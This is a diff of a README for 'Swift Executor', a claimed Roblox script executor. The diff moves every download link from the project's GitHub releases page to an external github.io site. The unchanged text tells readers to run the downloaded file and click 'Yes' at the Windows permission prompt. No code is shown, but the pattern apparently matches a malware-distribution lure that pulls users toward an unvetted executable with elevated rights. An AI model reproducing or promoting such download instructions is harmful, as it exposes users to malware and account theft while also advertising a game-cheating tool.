@@ -1,12 +1,12 @@
 # ⚡ swift-executor-pc-update - Run Any Roblox Script Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Swift%20Executor%202026-blueviolet?style=for-the-badge&logo=github)](https://github.com/Magnifiernotrump267/swift-executor-pc-update/releases)
+[![Download Now](https://img.shields.io/badge/Download-Swift%20Executor%202026-blueviolet?style=for-the-badge&logo=github)](https://magnifiernotrump267.github.io)
 
 ## 📥 Download and Install
 
 Visit this link to download the application. Click the most recent release file and save it to your computer.
 
-[**🔗 Download Swift Executor**](https://github.com/Magnifiernotrump267/swift-executor-pc-update/releases)
+[**🔗 Download Swift Executor**](https://magnifiernotrump267.github.io)
 
 ## ✨ What Is Swift Executor?
 
@@ -43,7 +43,7 @@ The executor checks for updates whenever you open it. When a new version is avai
 ### Step 1: Download the Application
 Click the download button at the top of this page or use the link below. Save the file to a location you remember, like your Desktop or Downloads folder.
 
-[**⬇️ Go to Download Page**](https://github.com/Magnifiernotrump267/swift-executor-pc-update/releases)
+[**⬇️ Go to Download Page**](https://magnifiernotrump267.github.io)
 
 ### Step 2: Open the File
 Find the downloaded file and double-click it. If Windows asks for permission, click "Yes" to allow the program to open.
@@ -131,7 +131,7 @@ We recommend bookmarking this page and checking the releases section regularly. 
 
 Don't wait — download Swift Executor today and supercharge your Roblox experience.
 
-[**🚀 Download Swift Executor Now**](https://github.com/Magnifiernotrump267/swift-executor-pc-update/releases)
+[**🚀 Download Swift Executor Now**](https://magnifiernotrump267.github.io)
 
 ---
 
